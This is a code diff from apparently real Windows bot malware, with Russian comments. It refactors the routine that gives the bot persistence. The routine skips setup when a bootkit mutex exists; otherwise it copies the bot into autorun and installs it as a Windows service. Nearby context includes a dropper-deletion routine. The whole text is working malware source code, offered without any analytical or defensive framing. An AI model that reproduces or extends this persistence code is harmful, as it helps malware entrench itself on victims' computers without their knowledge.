@@ -91,48 +91,30 @@ void InternalAddToAutorun()
 	// только в случае если в системе не зарегистрирован мьютекс
 	// сигнализирующий об успешной установке буткита
 	#ifndef DEBUGBOT
-	if (!WSTR::IsEmpty(TempFileName))
-
-	const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
-	HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
-	if (Mutex != NULL)
-	{
 		const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
 		HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
 		if (Mutex != NULL)
-			pCloseHandle(Mutex);
-			MDBG("Main", "Буткит установлен. Игнорируем добавление в автозагрузку.");
-			return;
-	}
-
-	bool ServiceInstalled = false;
-	#ifndef DEBUGBOT
-		if (!WSTR::IsEmpty(TempFileName))
 		{
+			if (Mutex != NULL)
+			{
 				pCloseHandle(Mutex);
 				MDBG("Main", "Буткит установлен. Игнорируем добавление в автозагрузку.");
 				return;
-		
-			PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
-			BOT::AddToAutoRun(Name);
-			ServiceInstalled = BOT::InstallService(Name);
-			STR::Free(Name);
+			}
 		}
 
-		
-		PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
+		bool ServiceInstalled = false;
+		if (!WSTR::IsEmpty(TempFileName))
+		{
+				PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
+				BOT::AddToAutoRun(Name);
+				ServiceInstalled = BOT::InstallService(Name);
+				STR::Free(Name);
+		}
 		if (!ServiceInstalled)
 			BOT::InstallService(BOT::GetBotFullExeName().t_str());
 
-		MDBG("Main", "Добавляем бот в автозагрузку.");
-
-		BOT::InstallService(Name);
-		BOT::AddToAutoRun(Name);
-		STR::Free(Name);
-	}
 	#endif
-
-
 }
 
 void DeleteDropper() // убиваем процесс, стираем файл
@@ -372,7 +354,6 @@ int APIENTRY MyMain()
 	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
 
 	DWORD dwProcessHash = File::GetNameHashW(ModulePath, false);
-	DWORD dwProcessHash  = File::GetNameHashW(ModulePath, false);
 	DWORD dwProcessHash2 = File::GetNameHashW(ModulePath, true);
 	
 	MDBG( "Main", "В процессе %S, %08x", ModulePath, dwProcessHash2 );
